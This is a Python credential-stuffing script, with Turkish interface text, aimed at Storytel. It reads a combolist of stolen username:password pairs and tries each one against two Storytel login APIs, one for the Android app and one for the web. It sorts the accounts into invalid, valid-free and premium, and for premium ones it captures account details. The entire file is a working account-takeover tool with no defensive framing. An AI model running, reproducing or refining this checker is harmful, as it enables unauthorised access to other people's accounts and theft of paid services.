try:
    import requests
    from colorama import Fore
    import tkinter
    from tkinter import filedialog
    import os
    import time
    import json
except Exception:
    print("Modüller eksik.")

root = tkinter.Tk()
root.withdraw()

os.system("cls")
os.system("echo off")
os.system("cls")

def menuu():
    print(Fore.LIGHTGREEN_EX)
    menu = """Developer: [DefaceR]MrX ..!"""
    return menu
print(menuu())

def banner():
    print(Fore.GREEN)
    HasFa = """
        StoryTel Android APi => 1
        StoryTel UHQ PRIV APi => 2
    """
    return HasFa
print(banner())

choice = input("APi Numarası Gir: ")
os.system("cls")

if "1" in choice:
    pass
elif "2" in choice:
    pass
else:
    print(Fore.LIGHTRED_EX)
    print("Hiç yakıştıramadım.")
    time.sleep(1)
    exit()

if choice == "1":
    class main:
        fileNameToken = filedialog.askopenfile(parent=root, mode="rb", title="Combolist Seç!")
        if fileNameToken is None:
            print()
            print(f"{Fore.LIGHTRED_EX} [!] Combolist Seç.")
        else:
            print(f" {Fore.GREEN} Combolist Yükleniyor.")
            os.system('cls')
            print(menuu())
            with open(fileNameToken.name, "r", encoding="utf-8") as i:
                tokenn = i.readlines()
                for lines in tokenn:
                    username = lines.split(":")[0].replace('\n', '')
                    password = lines.split(":")[1].replace('\n', '')

                    headerss = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                        "Pragma": "no-cache",
                        "Accept": "*/*",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }

                    try:
                        r = requests.get(f"https://storytel.com/api/login.action?uid={username}&pwd={password}&token=guesttr&version=6.13.7&terminal=android&locale=tr&kidsMode=false",
                                         headers=headerss)

                        if "USER_NOT_FOUND" in r.text:
                            print(f" {Fore.RED} {username}:{password} >> Wrong Account")
                        elif "WRONG_PASSWORD" in r.text:
                            print(f" {Fore.RED} {username}:{password} >> Wrong Account")
                        elif "cloudflare" in r.text:
                            print(f" {Fore.LIGHTYELLOW_EX} Ban Proxy")
                        elif "message\":null" in r.text:
                            print(f" {Fore.YELLOW} {username}:{password} >> Valid And Free")
                        elif "message\":\"PREMIUM" in r.text:
                            capture = json.loads(r.text)
                            Dil = capture["accountInfo"]["lang"]
                            MailOnay = capture["accountInfo"]["emailVerified"]
                            Tarih = capture["accountInfo"]["createdAt"]
                            print(f"{Fore.LIGHTGREEN_EX} PREMIUM >> {username}:{password} >> Dil = {Dil} | Mail Onayı = {MailOnay} | Hesap Açılma Tarihi = {Tarih}")
                    except requests.exceptions.ConnectTimeout as e:
                        pass
                    except requests.exceptions.ConnectionError as e:
                        pass
                    except requests.exceptions.HTTPError as e:
                        pass
                    except requests.exceptions.Timeout as e:
                        pass
                    except requests.exceptions.TooManyRedirects as e:
                        pass
if choice == "2":
    class mainapi:
        fileNameToken = filedialog.askopenfile(parent=root, mode="rb", title="Combolist Seç!")
        if fileNameToken is None:
            print()
            print(f"{Fore.LIGHTRED_EX} [!] Combolist Seç.")
        else:
            print(f" {Fore.GREEN} Combolist Yükleniyor.")
            os.system('cls')
            print(menuu())
            with open(fileNameToken.name, "r", encoding="utf-8") as i:
                tokenn = i.readlines()
                for lines in tokenn:
                    username = lines.split(":")[0].replace('\n', '')
                    password = lines.split(":")[1].replace('\n', '')

                    headerss = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    datamiz = f"uid={username}&pwd={password}&deviceVersion=webid&device=web"
                    try:
                        r = requests.post(f"https://www.storytel.com/api/v2/auth/login",headers=headerss, data=datamiz)

                        if "Unauthorized" in r.text:
                            print(f" {Fore.RED} {username}:{password} >> Wrong Account")
                        elif "cloudflare" in r.text:
                            print(f" {Fore.LIGHTYELLOW_EX} Ban Proxy")
                        elif "message\":null" in r.text:
                            print(f" {Fore.YELLOW} {username}:{password} >> Valid And Free")
                        elif "message\":\"PREMIUM" in r.text:
                            capture = json.loads(r.text)
                            Dil = capture["accountInfo"]["lang"]
                            MailOnay = capture["accountInfo"]["emailVerified"]
                            Tarih = capture["accountInfo"]["createdAt"]
                            print(
                                f"{Fore.LIGHTGREEN_EX} PREMIUM >> {username}:{password} >> Dil = {Dil} | Mail Onayı = {MailOnay} | Hesap Açılma Tarihi = {Tarih}")
                    except requests.exceptions.ConnectTimeout as e:
                        pass
                    except requests.exceptions.ConnectionError as e:
                        pass
                    except requests.exceptions.HTTPError as e:
                        pass
                    except requests.exceptions.Timeout as e:
                        pass
                    except requests.exceptions.TooManyRedirects as e:
                        pass
